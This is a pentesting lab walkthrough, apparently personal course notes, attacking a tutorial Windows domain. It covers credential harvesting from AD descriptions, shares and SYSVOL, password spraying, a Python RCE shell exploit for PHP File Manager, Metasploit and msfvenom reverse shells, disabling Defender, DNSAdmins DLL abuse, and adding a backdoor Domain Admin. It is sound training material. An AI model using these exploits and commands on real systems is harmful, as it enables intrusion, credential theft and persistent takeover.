---
aliases:
  - 00xNetrunner
tags:
  - Pentesting
sticker: emoji//1f3f4
---
![[SystemHacking_Figure_1.png|200]]


# 1.0 GENERIC WINDOWS SERVER HACKING METHODS
-------
The following describes some of the generic simple attacks that are used by penetration testers.

## 1.1 INFORMATION FOUND IN THE USER ACCOUNTS DESCRIPTION
------------
AD accounts possess multiple attributes, including phone numbers, email addresses, and others. Among these attributes, the description holds significant importance as it is commonly utilized for concise annotations that depict users, such as "Head of IT." Nevertheless, on certain occasions, penetration testers have detected instances where these comments might contain genuine passwords or indications related to passwords.

**Active Directory Explorer** (AD Explorer) is a simple Active Directory viewer and editor.

- Start **server 1** (Tutorial Network)
- Start **Client 1** 
- Connect to **Client 1**
- Login as the pen test user (**test/test123**)
- Copy **ADexplorer** from the tools folder to the desktop on Client1.
- Run **ADexplorer** 
- Connect to ***192.168.10.1*** with Username *test* and Password *test123*
![[Pasted image 20231119054851.png]]

- Select the server and then the Search icon. 
![[Pasted image 20231119054948.png]]

- search for an **ATTRIBUTE** called *description* of *not empty*
![[Pasted image 20231119055047.png]]
> Select Add


- Then Select Search. 
![[Pasted image 20231119055337.png]]#

This provides a comprehensive compilation of all items in AD accompanied by some form of description. It is worth noting that, upon closer examination of the bottom section of the list, Della Woods is observed to possess the description "**Thisisverysecret1**"

- Double click on Della Woods and we get all the AD Information about the user, including the SamAccountname i.e username of D.Woods.

![[Pasted image 20231119055846.png]]

- To authenticate the validity of the provided password, an empirical measure can be undertaken by initiating a command prompt on Client1 and attempting the following operation: -

```powershell
runas /user:uadtargetnet\D.Woods powershell.exe
```

If this password is input by the user, it will initiate the execution of PowerShell, subsequently granting access to the user's account under the name D.Woods. In the absence of a correct password, the designated command sequence will not be executed.

> Another common search used by pen testers in the description field would include pass or password: - 
>> e.g the description might be **password = test123** 

## 1.2 INFORMATION FOUND IN SHARES
--------
Many times, network files contain a wealth of valuable information. These files may have been placed there either by the user or by the system administrator. System administrators often utilise scripts to automate various processes, but sometimes passwords inadvertently slip through, with some even being hard-coded into the scripts. As an illustration, consider the following file, which contains login credentials for *V. Vargas* with a password of *sHkQa8XFC.*
![[Pasted image 20231119063308.png]]

Common file types and the strings that contain passwords are: -

| File Extension | Keywords                                   |
| -------------- | ------------------------------------------ |
| **.ps1**           | ConvertTo-SecureString, SqlConnection, LdapConnection, NetworkCredential |
| **.vbs**           | strDomain, strPassword                     |
| **.sql**           | Trusted_Connection, Integrated Security, Connect |
| **.txt**           | pwd, pas                                   |

### 1.21 Find all shares on a machine
To find the shared folders on a machine on the network, the net view command can be a good way to do this. form a CMD prompt on Client1: - 

```powershell
net view \\Server1
```

![[Pasted image 20231119064322.png]]
> Note that any machine on a network can be viewed using this command

### 1.2.2 Searching all files in a share for keywords
Lets search all files on a share for password, or other clues, we can do this by using this simple PowerShell command,

	- Run cmd and type in - powershell

Now input the following: - 

```powershell
Get-ChildItem -Path "\\Server1\Resources\" -Recurse | Select-String -Pattern "strPassword"
```

And

```powershell
Get-ChildItem -Path "\\Server1\HR\" -Recurse | Select-String -Pattern
"strPassword"
```
#### Command Breakdown:

1. **Get-ChildItem**
    
    - **Description**: A cmdlet in PowerShell used to retrieve items (files and directories) in a specified location.
    - **Function**: Similar to `ls` in UNIX or `dir` in Windows command line, but more powerful with additional parameters.
2. **-Path "\Server1\Resources"**
    
    - **Parameter**: `-Path`
    - **Function**: Specifies the path of the folder to search in.
    - **Details**: In this case, it's a network location `\\Server1\Resources\`, indicating a shared folder on a server named 'Server1'.
3. **-Recurse**
    
    - **Type**: Switch parameter for `Get-ChildItem`.
    - **Function**: Instructs the cmdlet to include all child items recursively, searching through all subdirectories of the specified path.
4. **| (Pipeline)**
    
    - **Function**: Passes the output of the command on the left (output of `Get-ChildItem`) as input to the command on the right.
5. **Select-String**
    
    - **Description**: A PowerShell cmdlet used for text searching within files.
    - **Function**: Searches through the input it receives for a specified text pattern.
6. **-Pattern "strPassword"**
    
    - **Parameter**: `-Pattern`
    - **Function**: Specifies the text pattern for `Select-String` to search.
    - **Details**: In this command, it's looking for occurrences of the string "strPassword".



![[Pasted image 20231119065615.png]]

This excerpt demonstrates that there exists a file named \\Server1\HR\dogs\script.vbs, which contains the string "strpassword." The file's content may be accessed through a straightforward "cat" command.

![[Pasted image 20231119065843.png]]

As evident from the aforementioned data, the act of performing this action has resulted in the acquisition of the username and password (J.Gray/abdictate9).

Additionally, users have the capability to navigate to the designated folder and access the script.vbs file.
![[Pasted image 20231119070111.png]]
> To access the script, one can locate it, right-click, and choose the "Edit" option.

As before, lets test the credentials, using : - 

```bash
runas /user:uadtargetnet\J.Gray powershell.exe
```



## 1.3 INFORMATION FOUND IN SYSVOL 
-------
**SYSVOL** is a fundamental directory present on each domain controller within a given domain. Its primary purpose is to store public files that must be accessible to clients while also ensuring synchronization among domain controllers. Typically, the default location for **SYSVOL** is **C:\Windows\SYSVOL**, although it is possible to modify this setting and relocate it to an alternative location.

In an academic context, any policy files and login scripts are typically stored in the sysvol folder. For instance, when a student accesses and logs into Abertay University's network, their respective rights, such as desktop settings, are loaded from SYSVOL.

For 2008r2 Server, any required passwords in files in SYSVOL are encrypted using AES (a symmetric key encryption). The secret key was published by Microsoft! [Windows Protocols](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)

The key : - 

4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b

There are alot of different tools that can decrypt this to find the password e.g gp3finder. 

> ðŸ’¡ Note that this vulnerability does not apply to servers in the year 2019. However, when the servers are upgraded to a more modern operating system, system administrators often replicate the SYSVOL from the previous system to the new one. This ensures the preservation of group policies and other relevant elements during the upgradeprocess. Nonetheless, it should be noted that the mentioned vulnerability remains valid in such cases.

- If we have the capability to navigate to the SYSVOL folder and locate these files, we could conduct a search within sysvol for the cpassword string by employing PowerShell : - 
```powershell
Get-ChildItem -Path "\\Server1\sysvol\" -Recurse | Select-String -Pattern "cPassword"
```
>Note the following command does not work in this network due to server restrictions on SYSVOL.

Now the cPassword for *T.Douglas*. is visible and can now be decrypted. 

This can be accomplished by running gp3finder through  cmd: - 

cd to where the tools are kept in my case 
```cmd
cd D:\VM's\tools>
```

- now type in the following
```powershell
gp3finder_v5.0.exe -D uiVkd5Daq7Tb2VqmH0BV5w
```

![[Pasted image 20231119073730.png]]

## 1.4 PASSWORD SPRAYING ATTACKS
-------
Most of the time, brute-force attacks employ a technique known as a dictionary attack. However, the success of such attacks is not guaranteed due to network lockout policies. This issue can be mitigated by attempting to use a single password across all user accounts. In the context of network security, this practice is commonly referred to as password spraying. It is worth noting that attackers often suggest including the company name followed by the current year or "2021" as part of the password, thereby increasing their chances of success.

- In order to proceed, kindly duplicate the file '*DomainPasswordSpray.ps1*'Â from the toolsÂ directory onto *Client1*. Additionally, it is feasible to request **ChatGPT** toÂ createÂ a passwordÂ sprayÂ scriptÂ in **.ps1** format for your use.
![[DomainPasswordSpray.ps1]]

From a command prompt, please type the following: - 
```powershell
# To open powershell
# Open up CMD first and then run this from the command line
powershell.exe -exec bypass

# To change directory
cd C:\Users\test\Desktop
Import-Module .\DomainPasswordSpray.ps1

# To start the spray attack
Invoke-DomainPasswordSpray -password uadtargetnet21
```

![[Pasted image 20231123171020.png]]
> The script ran successfully, and from that we were able to find a user using the password **uadtargetnet21** 


Now try passwords we have already obtained
- test234
- abdicate9
- Thisisverysecret1

![[Pasted image 20231123171729.png]]
> Now we have the domain admin password. 

## 2.0 REMOTE CODE EXECUTION
-------
One well-known vulnerability in web application hacking is Remote Code Execution. This type of vulnerability allows an attacker to execute code of their choosing with elevated privileges on a server that possesses the appropriate weakness. By exploiting this vulnerability, the attacker would be able to access any and all information on a server, such as a database.

- Run the Sever2 virtual machine (and close down Server1 and Client1)

During the enumeration/scanning phase, it was determined that Server two was running phpfilemanager.

on a browser from the main machine, enter the following 
```
192.168.10.2/index.php
```
![[Pasted image 20231123184059.png]]

Research shows that this has remote code execution vulnerability 

- Go to [Exploit-DB](https://www.exploit-db.com/exploits/37709) for the the PHP File Manager exploit
> This exploit will allow a pentester to execute commands via the browser search bar. e.g:
```txt
http://192.168.10.2/index.php?action=6&current_dir=%20C:%5Ctemp%5CUniServerZ%5Cwww/&cmd=c%3A%5CWindows%5Csystem32%5Ccalc.exe
```
>Putting this into the search bar will open up the cmd on the victims PC. 

Now we can execute this exploit; however, its execution will not be visually apparent. To overcome this limitation, we may employ a workaround by accessing server2 through the **Administrator**/**Thisisverysecret1** credentials. This will allow us to observe the deployment of the exploit.

![[Pasted image 20231123224343.png]]
> When running the exploit from the browser we will get this when we hit enter

![[Pasted image 20231123224423.png]]
> Running ***tasklist*** we can see that win32calc.exe is now running as a background process.


## 2.1 USING EXPLOITS THAT ARE AVAILABLE ON THE INTERNET.
-------

Thanks to sites like [exploit-db](https://www.exploit-db.com/) and [github-cve-repository](https://github.com/trickest/cve), there are hundreds, if not thousands, of exploitations available on these platforms. Now, let's search these websites to see if we can find any exploits for the server of this particular machine.  
  
Other useful links include: ~ 
  
- [DoctorHackerAbertay - Exploits](https://github.com/DoctorHackerAbertay/Exploits)  
	- Ethical hacking lecturers' exploit repository, primarily focused on PHP application exploits.  
- [GhostTroops - TOP All bugbounty pentesting CVE-2023- POC](https://github.com/GhostTroops/TOP)  
	- Top 30 bug bounty exploits sorted by year.
- [CVExploits Search](https://cvexploits.io/)
	- Website that lets you search through hundreds of know exploits and vulnerabilities. 

### 2.1.1 Identifying the language of the exploit
![[Pasted image 20231203235329.png|200]]

Nowadays their are 100s of programing languages each coming with their own bugs and cons, meaning hackers or pentester can take advantage of them. hackers are also able to use these languages to create their own exploits a script that can be used to gain access or attack a machine. 
**Python** and **PHP** being the most common. 

**PHP** - Is easy to identify as it normally starts with `<?php` at the start.
```php
<?php

error_reporting(0)
set_time_limit(0)
```

### 2.1.2 Using Python Exploits

![[Pasted image 20231203235411.png|200]]
The majority of exploits are typically implemented in Python due to its accessibility and versatility as a programming language.

> It is worth mentioning that exploits developed in Python 3.x may not function as intended in Python 2.x, thus necessitating early identification of this discrepancy to avoid unnecessary time wastage.

**Python 2.x** 
Old web application exploits may potentially utilise urllib to identify the Python version being employed. An example of such identification can be observed at the initialisation of a Python 2.x programme or script, as depicted below: ~
```Python
import urllib,urllib2,time
```

**Python 3.x**
Newer web-based exploits often employ the following Python libraries. Examples of their usage may include: ~
```Python
import requests
requests.Session().
```

> It is crucial to recognise the programming language being used in order to execute it correctly. For instance, if one intends to execute a Python 2 script from the terminal, the command would appear as follows: ~
```bash
sudo python2 exploit.py 
```

### 2.1.3 Deploying an exploit 

For this part we are gonna build our own PHP exploits lets just pretend that we downloaded it from exploit-db. the script is gonna attack Server 2

```Python
# Exploit Title : PHP FILE MANAGER
# Date : 18th August 2019
# Exploit Author : C.McLean/Doctor_Hacker@twitter
# Version : 0.9.8
# Tested on : Windows

import requests


#Define IP and port.
IP='192.168.10.2'
port=80


url='http://'+IP+':'+str(port)+'/index.php'

my_session = requests.Session()


#Set all POST variables.
payload = {'frame': '3', 'pass':'' }



#Now do the POST.
x = my_session.post(url,data=payload)


url='http://'+IP+':'+str(port)+'/index.php?action=6&current_dir= C:/Users/Administrator/Desktop/USBWebserver%20v8_en /&cmd=c:\
Windows\system32\cmd.exe /c '
print (url)


#Create a shell.
print ("Type: exit to break")

while True: 

	# Get the command
	cmd = input('shell@'+IP+':~#')

	# Send the command
	url2=url+cmd

	# Get response and display
	response = my_session.get(url2)
	print(response.text)

	# exit to break
	if cmd.strip() == 'exit':
			break

# And sleep........
```
- The script is designed to exploit a vulnerability in the PHP File Manager version 0.9.8, allowing for remote command execution.
- It employs basic networking and HTTP session handling in Python to interact with the target server.

> You can find more of colins exploits at his - [Github](https://github.com/DoctorHackerAbertay/Exploits)

Now, let us commence and utilize this exploit to generate a shell.  
  
For this illustration, we will employ the primary Windows machine. Ensure that **Server 2** is powered on, duplicate the script, open Notepad, and paste it there. Subsequently, save the script as **"exploit.py."**  
  
It can be observed from the "import requests" statement that **Python 3** is being employed, which is typically pre-installed on Windows. However, if it is not installed, it can be downloaded from [HERE](https://www.python.org/downloads/).  
  
To confirm whether Python is installed, open PowerShell and type in **"python3.11"** This action should initiate the Python 3.11 console.
![[Pasted image 20231204012938.png]]

To install the required Python library, we will use the command _pip install_. However, before doing so, let's navigate to the desktop directory where the exploit has been saved.
![[Pasted image 20231204013207.png]]

Now to install the library: ~
```powershell
pip install requests 
```

now lets run the exploit by entering the following: ~ 
```powershell
python exploit.py 
```

just like that we have a shell. 
![[Pasted image 20231204013637.png]]

Now, we can execute commands such as *ipconfig* to observe the existence of a pseudo command prompt: ~
![[Pasted image 20231204014027.png]]

## 2.2 Using Metasploit to get a command prompt
----
Now lets do the same thing again but using Metasploit to get the command prompt.

- Start the **Kali Linux** machine and open a **terminal**
- Start Metasploit with `msfconsole`
- When Metasploit starts use the search command to find **phpfilemanager**
```bash
search phpfilemanager
```
- Set it so that the phpfilemanager exploit is selected and ready to deploy
```bash
use exploit/multi/http/phpfilemanager_rce
```

![[Pasted image 20231204015645.png]]
- Now lets set up the exploit with the port and server IP 
```bash
show options
```

![[Pasted image 20231204015721.png]]
- As you can see from the above screenshot the exploit target is set to Unix we need to change this to Windows. 
```bash
show targets
```

![[Pasted image 20231204015959.png]]
- now set the target to windows
```bash
set target 1
```

![[Pasted image 20231204020317.png]]

- As evident, we have successfully set the target to Windows. However, it is imperative to configure all the options accordingly. There is a field labelled "Required" where all items marked as "yes" must be set, otherwise the exploit will not function effectively.
- So we need to set the *RHOSTS*, *RPORT* (If not set) and the *LHOST* we also need to set a payload 

```bash
set RHOSTS 192.168.10.2

set targeturi /index.php

set LHOST 192.168.10.253
```

- Now lets have a look at all the different payload we can use, and select one. 
```bash
show payloads
```

![[Pasted image 20231204021528.png]]
- Since this is a windows machine it would be a goo idea to use the **reverse_powershell** payload
- Run show options again and the setting should look something like this: ~ 
![[Pasted image 20231204021921.png]]

![[Pasted image 20231204022433.png]]
> After running the exploit we can see it didn't work, this is due to anti-virus running on the server.

1. There is a few ways that a pentester can get around this, we could use the *Psexec* tool to disable the anti-virus since we have a list of admin accounts with the passwords. 
2. A pentester could also obfuscate the payload by using certain tools or using msfvenom to encode the payload. 

In this guide i am going to be using the *Psexec* tool as i already have a list of accounts that i can make use of. 

>Also note that Colin McLeanâ€™s Python exploit that we used previously was successful.
  If Windows Defender does not recognize the code as malware then it wonâ€™t stop it running. i.e. There
  is a big advantage to being able to script your own exploits (we will look at doing this in the future).

> You can find the PsExec method in part 1 of this guide. Follow the guide then go back to msfconsole to run the exploit again.

- if this method does not work, we are able to cheat a little bit and disable the anti-virus manually by logging on to the Administrator account, the password is **Thisisverysecret1**
- open the command prompt and run PowerShell and enter the following:~ 
  `Set-MpPreference -DisableRealtimeMonitoring $true`

![[Pasted image 20231204024556.png]]
> Now as you can see the payload was succseful it did not put us into the sessions though, but it is running, type the following to see the sessions that was created: ~ `sessions`
![[Pasted image 20231204024704.png]]
>> As of now its best not to interact with the sessions at this time, as its pretty unstable next section will go over how a pentester can **upgrade** the shell. 

## 2.3 Upgrading a Metasploit command prompt to a meterpreter shell.
----
In this section i will be going over how to use shell_to_meterpreter a simple yet effective tool to upgrade a Metasploit shell to meterpreter.  

lets begin. 

```bash

# Select shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter

# set the session and run the command
set session 1 


run
```

![[Pasted image 20231204025434.png]]
> metasploit has not succefully created a meterpreter shell run `sessions` again to view
![[Pasted image 20231204025525.png]]

- Now lets interact with the meterpreter session enter the following to do so:~
```bash
sessions -i 3
```
![[Pasted image 20231204025636.png]]
> Note if you want to exit but not close the shell just type in `bg` this will now close the session but keeps it running in the background. 

***Reference***: ~ [HERE](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646)

# 3.0 ACTIVE DIRECTORY MICONFIGURATIONS
--------
an Active Directory misconfiguration is like having a set of wrong or mixed-up instructions in a big company, Imagine if this company said employees can go into any room they wanted like the server room, or the bosses office. if they employee enters this room they can find out information that they should not really know like how much someone is getting paid, or passwords written down on a note next to a computer. 

AD Misconfiguration, on a PC is the same it lets non admin users see folders or information that only an admin should see. 

now lets go over some of the most common AD Misconfigurations. 

## 3.1 ABUSEING DNS-ADMIN
-----
Members of the *DNSAdmins* group possess the necessary privileges to oversee user management on the Windows server. Leveraging the login credentials for the Admin user, we utilize tools such as **WinRM** to surreptitiously load a malicious DLL file. This DLL file enables us to establish a netcat reverse shell, thereby granting us unrestricted access to the server. Subsequently, we can proceed to add a new user to the admin group.

First thing we will need to do is enable `Enable-PSRemoting` with **PsExec** tool. form a windows machine. 

1. Open *PowerShell* as admin
2. Change directory with the *cd* command to the location of **PsExec** 
3. Run the following from *PowerShell*
```powershell
.\PsExec.exe \\192.168.10.1 -u Administrator powershell
```
4. Enter the admin password in this case its ***Thisisverysecret1***
![[Pasted image 20231222001555.png]]
> As you can see we are not logged into the admin *PowerShell*
5. Now run `Enable-PSRemoting` from the *PowerShell* window. 

Lets go back to our **Kali Linux** Machine. 

Form the our kali machine. lets start the **WinRM** Service on kali the service is called **evil-winrm**

Run the following from a Kali Linux terminal
```bash
evil-winrm -i [IP address] -u [username] -p [password]
```
> Remember to changes the Ip, username and password to your target. 
![[Pasted image 20231222002909.png]]
> keep the session open and open up a new terminal tab

Now we are going to be using **msfvenom** to create a malicious DLL
```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=80 -f dll > exploit.dll
```
> In this case we will be using the IP address of the Kali Linux Machine. which is *192.168.10.253*
> **-a** flag stands for architecture, with this we choose what architecture we will be creating the payload for
> **-p** flag stands for payload followed by the selected payload. 

after the dll has been created, we go back to our Evil-WinRM sessions, to upload it. 
```powershell
upload /path/to/exploit.dll /path/to/remote/destination
```
> In my case i uploaded the .dll to the desktop. 
![[Pasted image 20231222020630.png|500]]

Now that the *exploit.dll* has been uploaded. we will not use the **dnscmd.exe** tool from the Evil-**WinRM** session to register the DLL

<u>Run the following</u> 
```powershell
dnscmd.exe <DCName> /config /serverlevelplugindll <PathToDLL>
```
![[Pasted image 20231222023303.png]]
> The DLL was successfully added to the registry

Now we set up a **netcat** listener on the attacking system. we will be using the same port we specified in the **msfvenom** command: ~

<u>Run from attack machine</u>
```bash
nc -lvnp 80
```
> Dw if its not doing anything we need to restart the DNS service from **WinRM** session.

![[Pasted image 20231222024133.png]]

<u>From WinRM</u>
```powershell
sc.exe stop dns
sc.exe start dns
```

when the dns service restarts the netcat reverse shell should connect as SYSTEM.
![[Pasted image 20231222040258.png]]

From here domain administrator persistence can be achieved, and a new user can be created and added to the Administrator privilege.
```powershell
net user Barney Password123 /add
net group "Domain Admins" /add Barney
```

Reference - [Here - Pentest-Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin)

## 3.1 VULNERABLE DCSYNC
----
Reference - [DCSync](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/dcsync)

